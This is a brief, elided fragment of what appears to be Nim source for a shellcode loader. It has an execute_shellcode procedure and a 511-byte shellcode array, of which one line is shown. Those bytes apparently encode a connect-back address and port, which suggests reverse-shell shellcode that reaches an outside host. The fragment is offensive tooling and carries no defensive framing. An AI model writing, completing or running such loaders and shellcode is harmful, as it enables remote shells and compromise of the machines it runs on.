...
proc execute_shellcode[I, T](shellcode: array[I, T]): void =           
...
proc go(): void =
    ...
    var shellcode: array[511, byte] = [
        ...
        0x49,0xbc,0x02,0x00,0x20,0xfb,0x0a,0x00,0x00,0x52,0x41,0x54,0x49,0x89,0xe4,
